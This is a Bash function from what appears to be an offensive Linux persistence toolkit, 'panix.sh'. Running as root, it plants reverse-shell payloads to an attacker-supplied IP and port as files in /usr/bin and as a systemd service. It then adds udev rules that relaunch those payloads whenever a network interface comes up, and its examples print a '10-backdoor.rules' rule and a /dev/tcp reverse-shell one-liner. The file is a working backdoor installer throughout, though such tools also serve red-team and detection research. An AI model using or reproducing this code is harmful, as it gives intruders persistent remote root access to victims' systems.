setup_udev() {
	local default=0
	local ip=""
	local port=""
	local mechanism=""
	local custom=0
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_udev() {
		echo "Usage: ./panix.sh --udev [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default udev settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --at | --cron | --systemd    Specify the mechanism to use"
		echo "--custom                     Use custom udev settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--at | --cron | --systemd )
				mechanism="$1"
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command="$1"
				;;
			--path )
				shift
				path="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
				exit 0
				;;
			--help|-h)
				usage_udev
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --udev --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi
		if [[ -z $mechanism ]]; then
			echo "Error: --default requires --at, --cron, or --systemd."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		case $mechanism in
			--at )
				# Check if 'at' utility is available
				if ! command -v at &> /dev/null; then
					echo "Error: 'at' utility is not available. Please install it to use --at option."
					exit 1
				fi

				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/atest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/atest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/10-atest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
				EOF
				;;

			--cron )
				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/crontest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/crontest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-crontest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/bin/bash -c 'echo \"* * * * * /usr/bin/crontest\" | crontab -'"
				EOF
				;;

			--systemd )
				# Create the systemd service unit
				cat <<-EOF > /etc/systemd/system/systemdtest.service

				[Unit]
				Description=Systemdtest Service

				[Service]
				ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
				Restart=always
				RestartSec=60

				[Install]
				WantedBy=default.target
				EOF

				systemctl daemon-reload
				systemctl enable systemdtest.service
				systemctl start systemdtest.service

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/12-systemdtest.rules
				SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemdtest.service"
				EOF
				;;
		esac

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --custom requires --command and --path."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		# Create the custom udev rules file
		echo "$command" > "$path"

	else
		echo "Error: Either --default or --custom must be specified for --udev."
		echo "Try './panix.sh --udev --help' for more information."
		exit 1
	fi

	# Reload udev rules
	sudo udevadm control --reload

	echo "[+] Udev persistence established."
}
